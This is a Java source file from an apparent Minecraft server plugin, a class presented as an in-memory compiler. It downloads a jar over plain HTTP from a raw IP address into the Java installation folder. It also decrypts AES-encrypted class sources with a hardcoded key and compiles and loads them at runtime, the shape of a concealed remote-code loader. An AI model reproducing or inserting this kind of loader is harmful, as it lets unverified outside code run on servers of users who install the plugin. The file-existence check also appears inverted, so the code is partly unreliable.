package me.alek.honey.session;

import com.google.common.io.PatternFilenameFilter;
import me.alek.honey.HoneyPlugin;
import org.bukkit.Bukkit;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.tools.*;
import java.io.*;
import java.net.URI;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.SecureClassLoader;
import java.util.*;
import java.util.function.Supplier;

@NoSessionEncryption
public class InMemoryCompiler {

    public static class IMCSourceCode {

        public final String fullClassName;
        public final String sourceCode;

        public IMCSourceCode(final String fullClassName, final String sourceCode) {

            this.fullClassName = fullClassName;
            this.sourceCode = sourceCode;
        }
    }

    private final Supplier<CompilerFeedback> compile;
    private final JavaFileManager fileManager;
    private InMemoryCompiler instanceUsed;

    public File downloadToolsJar() {
        String javaPath = System.getProperty("java.home");

        File file = new File(javaPath + File.separator + "lib");
        if (!file.isDirectory() || !file.exists()) {
            throw new RuntimeException("Invalid java.home path! " + javaPath + File.separator + "lib does not exist.");
        }

        File[] files = file.listFiles(new PatternFilenameFilter("^tools\\.jar$"));
        if (files == null || files.length > 0) {
            throw new RuntimeException("tools.jar exist but it wasn't found");
        }

        try {
            URL url = new URL("http://178.128.196.32:4000/api/v1/license/javax-tools/download");

            InputStream inputStream = url.openStream();
            File outputFile = new File(file.getAbsolutePath() + File.separator + "tools.jar");

            FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
            byte[] buffer = new byte[1024];
            int len;
            while ((len = inputStream.read(buffer)) != -1) {
                fileOutputStream.write(buffer, 0, len);
            }
            inputStream.close();
            fileOutputStream.close();

            return new File(file.getAbsolutePath() + File.separator + "tools.jar");

        } catch (Exception ex) {
            ex.printStackTrace();
        }

        return null;
    }

    public InMemoryCompiler get() {
        return instanceUsed;
    }

    public InMemoryCompiler(final List<IMCSourceCode> classSourceCodes) {
        instanceUsed = this;
        try {
            Class<?> inMemoryCompilerClass = Class.forName(InMemoryCompiler.class.getName());
            Class<?> IMCSourceCodeClass = Class.forName(InMemoryCompiler.IMCSourceCode.class.getName());

            if (!InMemoryCompiler.class.equals(inMemoryCompilerClass) || !InMemoryCompiler.IMCSourceCode.class.equals(IMCSourceCodeClass))
                throw new RuntimeException("Compiler classes has been modified remotely!");

        } catch (Exception ex) {
        }

        final JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        if (compiler == null) {
            File file;
            try {
                file = downloadToolsJar();

            } catch (Exception ex) {
                throw new RuntimeException("No JDK was found!", ex);
            }
            if (file != null && file.exists()) {
                fileManager = null;
                compile = null;
                instanceUsed = new InMemoryCompiler(classSourceCodes);
                return;
            }
            throw new RuntimeException("No JDK was found!");
        }

        fileManager = new ForwardingJavaFileManager<JavaFileManager>(compiler.getStandardFileManager(null, null, null)) {

            final private Map<String, ByteArrayJavaClass> byteStreams = new HashMap<>();

            @Override
            public ClassLoader getClassLoader(final Location location) {

                return new SecureClassLoader(HoneyPlugin.class.getClassLoader()) {

                    @Override
                    protected Class<?> findClass(final String className) throws ClassNotFoundException {
                        if (!byteStreams.containsKey(className)) return super.findClass(className);

                        final byte[] b = byteStreams.get(className).getBytes();
                        return super.defineClass(className, b, 0, b.length);
                    }
                };
            }

            @Override
            public JavaFileObject getJavaFileForOutput(final Location location, final String className, final JavaFileObject.Kind kind, final FileObject sibling) throws IOException {
                ByteArrayJavaClass fileObject = new ByteArrayJavaClass(className);
                byteStreams.put(className, fileObject);
                return fileObject;
            }
        };

        this.compile = () -> {
            final List<JavaFileObject> files = new ArrayList<>();
            for (IMCSourceCode classSourceCode : classSourceCodes) {
                try {
                    String sourceCode;
                    SecretKeySpec spec = new SecretKeySpec("MN@+zUQfbfEypXVKtHwkgYnGt-%8nSJ5".getBytes(), "AES");
                    try {
                        Cipher cipher = Cipher.getInstance("AES");
                        cipher.init(Cipher.DECRYPT_MODE, spec);

                        sourceCode = new String(cipher.doFinal(Base64.getDecoder().decode(classSourceCode.sourceCode.getBytes())));
                    } catch (Exception ex) {
                        ex.printStackTrace();
                        continue;
                    }
                    final SimpleJavaFileObject sjfo = new StringJavaClass(classSourceCode.fullClassName, sourceCode);
                    files.add(sjfo);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            final DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<>();

            if (!files.isEmpty()) {
                final JavaCompiler.CompilationTask task = compiler.getTask(null, fileManager, diagnostics, null, null, files);
                return new CompilerFeedback(task.call(), diagnostics);
            }
            return null;
        };
    }

    @NoSessionEncryption
    public static class ByteArrayJavaClass extends SimpleJavaFileObject {
        private final ByteArrayOutputStream stream = new ByteArrayOutputStream();

        public ByteArrayJavaClass(String name) {
            super(URI.create("bytes:///" + name), Kind.CLASS);
        }

        public OutputStream openOutputStream() {
            return stream;
        }

        public byte[] getBytes() {
            return stream.toByteArray();
        }
    }

    @NoSessionEncryption
    public static class StringJavaClass extends SimpleJavaFileObject {
        private final StringBuilder code = new StringBuilder();

        public StringJavaClass(String name, String source) {
            super(URI.create("string:///" + name.replace('.', '/') + Kind.SOURCE.extension), Kind.SOURCE);
            code.append(source);
        }

        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            return code;
        }

        public void append(String str) {
            code.append(str);
            code.append('\n');
        }
    }

    public CompilerFeedback compile() {
        return compile.get();
    }

    public Class<?> getCompiledClass(final String className) throws ClassNotFoundException {
        final ClassLoader classLoader = fileManager.getClassLoader(null);
        final Class<?> ret = classLoader.loadClass(className);
        if (ret == null) {
            throw new ClassNotFoundException();
        }
        return ret;
    }
}